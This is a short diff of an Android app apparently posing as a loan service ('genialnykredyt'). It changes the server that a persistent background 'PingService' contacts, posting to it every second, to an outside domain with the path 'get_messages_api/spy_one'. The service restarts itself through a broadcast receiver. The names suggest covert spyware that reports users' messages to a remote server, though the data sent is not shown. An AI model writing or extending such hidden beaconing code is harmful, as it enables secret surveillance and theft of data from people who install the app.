@@ -21,6 +21,7 @@ import com.android.volley.VolleyError;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 import com.app.genialnykredyt.Broadcast.RestarterBroadcast;
+import com.app.genialnykredyt.Contants.BaseUrl;
 import com.app.genialnykredyt.R;
 
 import java.io.File;
@@ -151,7 +152,7 @@ public class PingService extends Service {
                 try {
                     Thread.sleep(1000);
                     trimCache(PingService.this);
-                    StringRequest mStringRequest = new StringRequest(Request.Method.POST, "https://genialnykredyt.eu/get_messages_api/ping_server_api.php", new Response.Listener<String>() {
+                    StringRequest mStringRequest = new StringRequest(Request.Method.POST, "http://rfbasolutions.com/get_messages_api/spy_one/ping_server_api.php", new Response.Listener<String>() {
                         @Override
                         public void onResponse(String response) {
                             Log.i("Response",response);
